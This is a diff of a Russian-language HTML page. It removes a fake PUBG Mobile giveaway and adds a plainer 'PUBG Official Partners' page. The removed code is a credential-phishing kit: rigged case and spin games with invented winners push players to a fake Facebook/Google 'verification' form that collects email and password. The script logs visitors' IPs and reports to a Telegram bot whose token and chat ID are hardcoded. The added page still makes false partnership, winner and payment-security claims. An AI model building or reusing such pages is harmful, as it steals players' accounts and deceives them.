@@ -2,561 +2,448 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUBG Mobile - Giveaway</title>
-    
-    <!-- Фавикон -->
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
-    
-    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Official Partners</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://cdn.tailwindcss.com"></script>
-
     <style>
-        :root {
-            --pubg-gold: #ffbc00;
-            --pubg-gold-dark: #cc9600;
-            --pubg-dark: #0b0c0d;
-            --pubg-blue: #0084ff;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-
+        
         body {
-            background-image: url('IMG_1807.png');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            color: white;
-            font-family: 'Inter', sans-serif;
-            margin: 0; padding: 0;
-            overflow-x: hidden;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            scroll-behavior: smooth; /* Плавный скролл */
-        }
-
-        /* --- СТИЛИ ПРЕЛОАДЕРА --- */
-        #preloader {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background-image: url('IMG_1807.png');
-            background-size: cover;
-            background-position: center;
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: opacity 0.5s ease;
-        }
-
-        .loader-box {
-            background: rgba(13, 15, 19, 0.9);
-            padding: 30px 50px;
-            border-radius: 15px;
-            text-align: center;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
+            color: #f0f0f0;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 15px;
+            padding: 20px;
         }
-
-        .spinner-snake {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top: 4px solid #ffffff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
-
-        .loader-box span {
+        
+        /* Черный верхний фон - уменьшенный и тонкий */
+        .top-banner {
+            width: 100%;
+            background-color: #000;
+            border-bottom: 3px solid #ff9900;
+            padding: 15px 0;
+            margin-bottom: 30px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.3);
+            border-radius: 0 0 8px 8px;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .top-banner h1 {
+            color: #ff9900;
+            font-size: 2.2rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(255, 153, 0, 0.5);
+        }
+        
+        .top-banner .subtitle {
             color: #ccc;
-            font-size: 18px;
+            font-size: 1rem;
+            margin-top: 5px;
+        }
+        
+        /* Основной контент */
+        .content {
+            width: 100%;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .partner-card {
+            flex: 1;
+            min-width: 300px;
+            max-width: 500px;
+            background: rgba(30, 30, 40, 0.8);
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid #333;
+        }
+        
+        .partner-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(255, 153, 0, 0.2);
+        }
+        
+        .card-header {
+            padding: 20px;
+            text-align: center;
+            background: linear-gradient(90deg, #222 0%, #333 100%);
+            border-bottom: 2px solid #ff9900;
+        }
+        
+        .partner-name {
+            font-size: 1.8rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+        
+        .partner-tagline {
+            color: #ff9900;
+            font-size: 1rem;
+        }
+        
+        .card-image {
+            width: 100%;
+            height: 220px;
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+        
+        .guft-drop-image {
+            background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1552820728-8b83bb6b773f?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1170&q=80');
+        }
+        
+        .lusky-spin-image {
+            background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1170&q=80');
+        }
+        
+        .image-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.5);
+        }
+        
+        .image-text {
+            color: #fff;
+            font-size: 2.5rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(255, 153, 0, 0.8);
+            letter-spacing: 3px;
+        }
+        
+        .card-description {
+            padding: 20px;
+            line-height: 1.6;
+            color: #ccc;
+            font-size: 1rem;
+        }
+        
+        /* Уведомление для победителей */
+        .winner-notification {
+            width: 100%;
+            max-width: 800px;
+            background: rgba(40, 40, 60, 0.9);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 30px 0;
+            border-left: 5px solid #ff9900;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .winner-icon {
+            flex-shrink: 0;
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ff9900 0%, #ff6600 100%);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 2.5rem;
+            color: #000;
+        }
+        
+        .winner-content h3 {
+            color: #ff9900;
+            font-size: 1.5rem;
+            margin-bottom: 8px;
+        }
+        
+        .winner-content p {
+            color: #ddd;
+            line-height: 1.5;
+        }
+        
+        /* Нижняя часть с партнерами */
+        .official-partners {
+            width: 100%;
+            background: rgba(20, 20, 30, 0.9);
+            border-radius: 12px;
+            padding: 25px;
+            margin-top: 20px;
+            text-align: center;
+            border-top: 3px solid #ff9900;
+        }
+        
+        .partners-title {
+            font-size: 1.8rem;
+            color: #ff9900;
+            margin-bottom: 20px;
+            text-transform: uppercase;
             letter-spacing: 1px;
         }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }        /* ------------------------ */
-
-        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
-
-        .uc-icon {
-            display: inline-flex;
-            align-items: center;
+        
+        .partners-logos {
+            display: flex;
             justify-content: center;
-            background: #1a1a1a;
-            border: 1px solid #c4a162;
-            border-radius: 4px;
-            padding: 1px 4px;
-            font-size: 10px;
-            font-weight: 900;
-            color: #fff;
-            margin-right: 4px;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 40px;
+            margin-top: 20px;
         }
-
-        header {
-            background: rgba(0, 0, 0, 0.95);
-            padding: 8px 16px;
+        
+        .partner-logo {
             display: flex;
             flex-direction: column;
-            gap: 1px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            position: sticky; top: 0; z-index: 100;
-            min-height: auto;
-        }
-
-        .balance-display {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 4px 10px;
-            display: flex;
             align-items: center;
-            gap: 4px;
-            border: 1px solid rgba(255,255,255,0.1);
+            gap: 10px;
         }
-
-        .btn-plus {
-            background: #4caf50;
-            width: 16px; height: 16px;
+        
+        .logo-circle {
+            width: 70px;
+            height: 70px;
             border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 10px; font-weight: bold;
-        }
-
-        .case-container {
-            position: relative;
-            width: 100%; height: 180px;
-            overflow: hidden;
-            margin: 20px 0;
-        }
-
-        .case-line {
-            position: absolute;
-            top: 0; left: 50%;
-            width: 2px; height: 100%;
-            background: var(--pubg-gold);
-            z-index: 20;
-            box-shadow: 0 0 15px var(--pubg-gold);
-            transform: translateX(-50%);
-        }
-
-        .case-tape {
+            background: #333;
             display: flex;
-            padding: 30px 0;
-            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
-            will-change: transform;
-        }
-
-        .case-item {
-            min-width: 140px;
-            width: 140px;
-            height: 120px;
-            display: flex;
+            justify-content: center;
             align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-            border-radius: 8px;
-            overflow: hidden;
-            transition: transform 0.2s ease-in-out;
-        }
-
-        .case-item.common { background: rgba(100, 100, 100, 0.5); }
-        .case-item.rare { background: rgba(0, 110, 255, 0.5); }
-        .case-item.epic { background: rgba(170, 0, 255, 0.5); }
-        .case-item.legendary { background: rgba(255, 170, 0, 0.5); }
-
-        .case-item img { width: 100px; height: 100px; object-fit: contain; opacity: 1 !important; }
-
-        .btn-blue {
-            background: linear-gradient(180deg, #0084ff 0%, #0056a7 100%);
-            color: white;
-            width: calc(100% - 32px);
-            margin: 0 16px;
-            padding: 16px;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 16px;
-            text-align: center;
-            display: block;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 0 20px rgba(0, 132, 255, 0.4);
-            animation: pulse-blue 2s infinite;
-        }
-
-        @keyframes pulse-blue {
-            0% { box-shadow: 0 0 0 0 rgba(0, 132, 255, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(0, 132, 255, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 132, 255, 0); }
-        }
-
-        .nav-bar {
-            position: fixed; bottom: 0; left: 0; right: 0;
-            background: #000; height: 65px;
-            display: flex; justify-content: space-around; align-items: center;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            z-index: 50;
-        }
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer;}
-        .nav-item.active { color: var(--pubg-gold); }
-
-        .modal {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 1000; display: none; flex-direction: column; padding: 20px;
-            justify-content: center;
-        }
-        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
-        
-        /* Новые стили для изображений игр */
-        .game-card-image {
-            width: 100%;
-            height: 140px;
-            object-fit: cover;
-            border-radius: 12px;
-            margin-bottom: 12px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
+            font-size: 2rem;
+            color: #fff;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
         }
         
-        /* Стили для партнеров внизу */
-        .partners-section {
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px 16px;
-            margin-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        .logo-circle:hover {
+            transform: scale(1.1);
         }
         
-        /* Стили для победителей */
-        .winner-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            border: 2px solid #ffbc00;
-            object-fit: cover;
-            background: linear-gradient(45deg, #1a1a1a, #333);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
+        .visa-logo {
+            background: linear-gradient(135deg, #1a1f71 0%, #ffffff 100%);
+            color: #1a1f71;
+        }
+        
+        .google-pay-logo {
+            background: linear-gradient(135deg, #5f6368 0%, #ffffff 100%);
+            color: #5f6368;
+        }
+        
+        .secure-logo {
+            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
+        }
+        
+        .logo-label {
+            color: #ccc;
+            font-size: 0.9rem;
+        }
+        
+        .secure-text {
+            color: #4CAF50;
             font-weight: bold;
-            font-size: 14px;
+            margin-top: 15px;
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        /* Адаптивность */
+        @media (max-width: 768px) {
+            .content {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .partner-card {
+                width: 100%;
+            }
+            
+            .winner-notification {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .partners-logos {
+                gap: 20px;
+            }
+            
+            .top-banner h1 {
+                font-size: 1.8rem;
+            }
+        }
+        
+        .pubg-style {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .pubg-style::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, #ff9900, #ff3300, #ff9900);
+            z-index: 5;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 153, 0, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 153, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 153, 0, 0); }
         }
     </style>
 </head>
 <body>
-
-    <!-- ПРЕЛОАДЕР -->
-    <div id="preloader">
-        <div class="loader-box">
-            <div class="spinner-snake"></div><span>loading...</span>
+    <div class="container">
+        <!-- Черный верхний баннер (уменьшенный) -->
+        <div class="top-banner">
+            <h1>PUBG OFFICIAL PARTNERS</h1>
+            <div class="subtitle">Эксклюзивные предложения для игроков</div>
+        </div>
+        
+        <!-- Основной контент с карточками партнеров -->
+        <div class="content">
+            <!-- GUFT DROP карточка -->
+            <div class="partner-card pubg-style">
+                <div class="card-header">
+                    <div class="partner-name">GUFT DROP</div>
+                    <div class="partner-tagline">Эксклюзивные игровые награды</div>
+                </div>
+                <div class="card-image guft-drop-image">
+                    <div class="image-overlay">
+                        <div class="image-text">GUFT DROP</div>
+                    </div>
+                </div>
+                <div class="card-description">
+                    <p>Получайте эксклюзивные награды в PUBG с GUFT DROP. Открывайте уникальные скины, оружие и экипировку, которые недоступны в обычном магазине. Каждый месяц новые дропы с ограниченными предметами.</p>
+                    <p style="margin-top: 15px; color: #ff9900;">Только для активных игроков PUBG с рейтингом выше золотого уровня.</p>
+                </div>
+            </div>
+            
+            <!-- LUSKY SPIN карточка -->
+            <div class="partner-card pubg-style">
+                <div class="card-header">
+                    <div class="partner-name">LUSKY SPIN</div>
+                    <div class="partner-tagline">Колесо удачи в PUBG</div>
+                </div>
+                <div class="card-image lusky-spin-image">
+                    <div class="image-overlay">
+                        <div class="image-text">LUSKY SPIN</div>
+                    </div>
+                </div>
+                <div class="card-description">
+                    <p>Испытайте удачу с LUSKY SPIN! Крутите колесо, чтобы выиграть редкие предметы, игровую валюту и эксклюзивные бонусы. Чем выше ваш уровень в PUBG, тем лучше призы вы можете получить.</p>
+                    <p style="margin-top: 15px; color: #ff9900;">Ежедневные бесплатные вращения для премиум-игроков.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Уведомление для победителей с анонимной картинкой -->
+        <div class="winner-notification pulse">
+            <div class="winner-icon">
+                <i class="fas fa-user-secret"></i>
+            </div>
+            <div class="winner-content">
+                <h3>АНОНИМНЫЙ ПОБЕДИТЕЛЬ</h3>
+                <p>Поздравляем нашего анонимного победителя, который выиграл эксклюзивный набор PUBG "Легенда Эрагеля" через GUFT DROP! Игрок предпочел остаться неизвестным, но его удача не останется незамеченной. Следите за новыми розыгрышами!</p>
+            </div>
+        </div>
+        
+        <!-- Нижняя часть с официальными партнерами -->
+        <div class="official-partners">
+            <div class="partners-title">OFFICIAL PARTNERS SECURE</div>
+            
+            <div class="partners-logos">
+                <div class="partner-logo">
+                    <div class="logo-circle visa-logo">
+                        <i class="fab fa-cc-visa"></i>
+                    </div>
+                    <div class="logo-label">Visa</div>
+                </div>
+                
+                <div class="partner-logo">
+                    <div class="logo-circle google-pay-logo">
+                        <i class="fab fa-google-pay"></i>
+                    </div>
+                    <div class="logo-label">Google Pay</div>
+                </div>
+                
+                <div class="partner-logo">
+                    <div class="logo-circle secure-logo">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="logo-label">Secure</div>
+                </div>
+            </div>
+            
+            <div class="secure-text">
+                <i class="fas fa-lock"></i> Все транзакции защищены и зашифрованы
+            </div>
         </div>
     </div>
-
-    <div id="live-winner" class="fixed top-20 left-4 z-[1000] bg-black/80 border-l-4 border-yellow-500 p-3 rounded-r-lg shadow-2xl transform -translate-x-[150%] transition-transform duration-500 flex items-center gap-3">
-        <div class="winner-avatar">
-            <i class="fas fa-user-secret text-lg"></i>
-        </div>
-        <div>
-            <div id="winner-name" class="text-xs font-bold text-yellow-400">Player123</div>
-            <div id="winner-item" class="text-[10px] text-white">получил M416 Glacier</div>
-        </div>
-    </div>
-
-    <header class="flex flex-col gap-1 border-b border-white/10">
-        <div class="flex justify-between items-center px-4 py-2">
-            <div class="flex items-center gap-2">
-                <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
-                <span class="text-[10px] text-gray-400 uppercase tracking-tighter">Server Online: <span class="text-white">2,841 players</span></span>
-            </div>
-            <div class="flex items-center gap-1 text-[10px] text-green-400">
-                <i class="fas fa-shield-alt"></i>
-                <span>SECURE SSL 256-BIT</span>
-            </div>
-        </div>
-        <div class="flex justify-between items-center px-4 pb-2">
-            <div class="flex items-center gap-2 cursor-pointer" id="backBtn" style="visibility: hidden;" onclick="showSection('hub')">
-                <i class="fas fa-chevron-left text-gray-400"></i>
-                <span class="text-sm font-bold">BACK</span>
-            </div>
-            <div class="balance-display">
-                <span class="uc-icon">UC</span>
-                <span id="headerBalance" class="text-sm font-bold tracking-wider">60</span>
-                <div class="btn-plus ml-1"><i class="fas fa-plus text-[8px]"></i></div>
-            </div>
-        </div>
-    </header>
-
-    <main id="section-hub" class="p-4">
-        <div class="grid grid-cols-2 gap-4 mt-2">
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
-                <img src="https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="game-card-image">
-                <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
-                <div class="text-xs text-gray-400 mt-1">Открывай кейсы и забирай награды</div>
-            </div>
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
-                <img src="https://images.unsplash.com/photo-1511512578047-dfb367046420?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" class="game-card-image">
-                <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
-                <div class="text-xs text-gray-400 mt-1">Крути рулетку и выигрывай</div>
-            </div>
-        </div>
-    </main>
-
-    <section id="section-case" style="display: none;">
-        <div class="text-center py-6">
-            <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
-        </div>
-        <div class="case-container">
-            <div class="case-line"></div>
-            <div id="caseTape" class="case-tape"></div>
-        </div>
-        <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</button>
-        <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Забрать приз</button>
-    </section>
-
-    <section id="section-spin" style="display: none;" class="p-5">
-        <div class="text-center py-4">
-            <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
-        </div>
-        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
-            <div class="grid grid-cols-3 gap-3">
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s0"><img src="priz1.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s1"><img src="priz2.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s2"><img src="priz3.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s7"><img src="priz4.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="mid"><img src="priz5.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain" style="opacity: 1;"></div><div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s5"><img src="priz8.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s4"><img src="priz9.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
-            </div>
-        </div>
-        <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
-        <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Забрать приз</button>
-    </section>
-
-    <div id="modalAuth" class="modal">
-        <div class="login-card">
-            <h2 class="font-black text-xl mb-4 text-center">Верификация аккаунта</h2>
-            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-facebook-f"></i> Facebook</button>
-            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-google"></i> Google</button>
-            <button onclick="document.getElementById('modalAuth').style.display='none'" class="w-full text-gray-400 text-sm mt-2 text-center">Отмена</button>
-        </div>
-    </div>
-
-    <div id="modalForm" class="modal">
-        <div class="login-card">
-            <h2 id="methodName" class="font-black text-xl mb-4">Login</h2>
-            <input type="text" id="inpUser" placeholder="Email или телефон">
-            <input type="password" id="inpPass" placeholder="Пароль">
-            <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">Войти</button>
-        </div>
-    </div>
-
-    <!-- Партнеры и безопасные платежи -->
-    <div class="partners-section">
-        <p class="text-center text-[10px] uppercase tracking-widest mb-4 text-gray-400">Official Partners & Secure Payments</p>
-        <div class="flex flex-wrap justify-center gap-6 items-center">
-            <i class="fab fa-cc-visa text-3xl text-blue-600"></i>
-            <i class="fab fa-cc-mastercard text-3xl text-red-600"></i>
-            <i class="fab fa-apple-pay text-4xl text-black"></i>
-            <i class="fab fa-google-pay text-4xl text-blue-800"></i>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Visa_2021.svg/320px-Visa_2021.svg.png" class="h-4">
-        </div>
-    </div>
-
-    <nav class="nav-bar">
-        <div class="nav-item" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
-        <div class="nav-item active" id="nav-hub" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
-        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user text-xl mb-1"></i><span>Profile</span></div>
-    </nav>
 
     <script>
-        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
-        const CHAT_ID = '1709490182';
-        const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
-        
-        const items = [
-            {name: 'UC 660', img: 'https://p7.itc.cn/q_70/images03/20210525/7d8eaf38362f48c5a95b07c8278aa154.png'},
-            {name: 'M416 Glacier', img: 'https://files.booyah.uz/upload/202205/08/booyah_1493268907247960060_1652018391704.jpg'},
-            {name: 'UC 1800', img: 'https://p7.itc.cn/q_70/images03/20210525/7d8eaf38362f48c5a95b07c8278aa154.png'}
-        ];
-        const names = ['Alex**', 'Kira_88', 'Legenda_PUBG', 'Mavrodi', 'Zxc_Boy', 'Killer_RU'];
-        
-        let balance = 60; 
-        let isSpinning = false;
-        let userIP = '';
-        const itemWidth = 140;
-        let currentWinCellId = null;
-
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
-
-        function showWinner() {
-            const winner = document.getElementById('live-winner');
-            const item = items[Math.floor(Math.random() * items.length)];
-            document.getElementById('winner-name').innerText = names[Math.floor(Math.random() * names.length)];
-            document.getElementById('winner-item').innerText = 'выбил ' + item.name;
-
-            winner.classList.remove('-translate-x-[150%]');
-            setTimeout(() => {
-                winner.classList.add('-translate-x-[150%]');
-            }, 4000);
-        }
-
-        function updateBalanceUI() {
-            document.getElementById('headerBalance').innerText = balance;
-            const canPlay = balance >= 60;
+        // Добавляем анимацию при загрузке страницы
+        document.addEventListener('DOMContentLoaded', function() {
+            const cards = document.querySelectorAll('.partner-card');
+            const notification = document.querySelector('.winner-notification');
             
-            document.getElementById('openBtn').style.display = canPlay ? 'block' : 'none';
-            document.getElementById('depositBtn').style.display = canPlay ? 'none' : 'block';
-            
-            document.getElementById('spinBtn').style.display = canPlay ? 'block' : 'none';
-            document.getElementById('spinDepositBtn').style.display = canPlay ? 'none' : 'block';
-        }
-
-        function showSection(id) {
-            if (isSpinning) return;
-            document.getElementById('section-hub').style.display = 'none';
-            document.getElementById('section-case').style.display = 'none';
-            document.getElementById('section-spin').style.display = 'none';
-            document.getElementById('section-' + id).style.display = 'block';
-            document.getElementById('backBtn').style.visibility = (id === 'hub') ? 'hidden' : 'visible';
-            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-            if(id === 'hub') document.getElementById('nav-hub').classList.add('active');
-            if(id === 'case') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
-            updateBalanceUI();
-            if (currentWinCellId) {
-                const winCell = document.getElementById(currentWinCellId);
-                if (winCell) {
-                    winCell.style.borderColor = 'transparent';
-                    winCell.style.boxShadow = 'none';
-                }
-                currentWinCellId = null;
-            }
-        }
-
-        function initCase() {
-            const tape = document.getElementById('caseTape');
-            tape.innerHTML = '';
-            let lastIdx = -1;
-            for(let i=0; i<80; i++) {
-                let idx;
-                do { idx = Math.floor(Math.random() * prizeImages.length); } while (idx === lastIdx);
-                lastIdx = idx;
+            // Анимация появления карточек
+            cards.forEach((card, index) => {
+                card.style.opacity = '0';
+                card.style.transform = 'translateY(20px)';
                 
-                // Случайный класс редкости
-                const rarityClasses = ['common', 'rare', 'epic', 'legendary'];
-                const rarity = rarityClasses[Math.floor(Math.random() * rarityClasses.length)];
-                
-                tape.innerHTML += `<div class="case-item ${rarity}"><img src="${prizeImages[idx]}" style="opacity: 1;"></div>`;
-            }
-            tape.style.transform = `translateX(0px)`;
-        }
-
-        function openCase() {
-            if (balance < 60 || isSpinning) return;
-            balance -= 60;
-            updateBalanceUI();
-            isSpinning = true;
-            const targetIdx = 45; 
-            const tape = document.getElementById('caseTape');
-            const screenCenter = window.innerWidth / 2;
-            const finalOffset = (targetIdx * itemWidth) - screenCenter + (itemWidth / 2);
-            tape.style.transform = `translateX(-${finalOffset}px)`;
-            setTimeout(() => {
-                sendTelegram(`🎁 Кейс открыт | IP: ${userIP}`);
-                isSpinning = false;
-                startAuth();
-            }, 5000);
-        }
-
-        function startSpin() {
-            if (isSpinning || balance < 60) return;
-            balance -= 60;
-            updateBalanceUI();
-            isSpinning = true;
-            const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
-            let step = 0;
-            const totalSteps = 25 + Math.floor(Math.random() * 10);
-            const winIndex = Math.floor(Math.random() * cells.length);
-            const winCellId = cells[winIndex];
-            document.getElementById('spinBtn').style.display = 'none';
-            const interval = setInterval(() => {
-                cells.forEach(id => {
-                    const cell = document.getElementById(id);
-                    cell.style.borderColor = 'transparent';
-                    cell.style.boxShadow = 'none';
-                });
-                const currentId = cells[step % cells.length];
-                const currentEl = document.getElementById(currentId);
-                currentEl.style.borderColor = '#ffbc00';
-                currentEl.style.boxShadow = '0 0 15px rgba(255, 188, 0, 0.5)';
-                step++;
-                if (step >= totalSteps) {
-                    clearInterval(interval);
-                    cells.forEach(id => {
-                        const cell = document.getElementById(id);
-                        cell.style.borderColor = 'transparent';
-                        cell.style.boxShadow = 'none';
-                    });
-                    const winCell = document.getElementById(winCellId);
-                    winCell.style.borderColor = '#ffbc00';
-                    winCell.style.boxShadow = '0 0 20px rgba(255, 188, 0, 0.8)';
-                    currentWinCellId = winCellId;
-                    setTimeout(() => {
-                        document.getElementById('spinDepositBtn').style.display = 'block';
-                        sendTelegram(`🎡 Рулетка | IP: ${userIP}`);
-                        isSpinning = false;
-                    }, 500);
-                }
-            }, 120);
-        }
-
-        function startAuth() { 
-            document.getElementById('modalAuth').style.display = 'flex'; 
-        }
-        
-        function openForm(m) {
-            document.getElementById('modalAuth').style.display = 'none';
-            document.getElementById('modalForm').style.display = 'flex';
-            document.getElementById('methodName').innerText = m;
-        }
-
-        async function finalSubmit() {
-            const u = document.getElementById('inpUser').value;
-            const p = document.getElementById('inpPass').value;
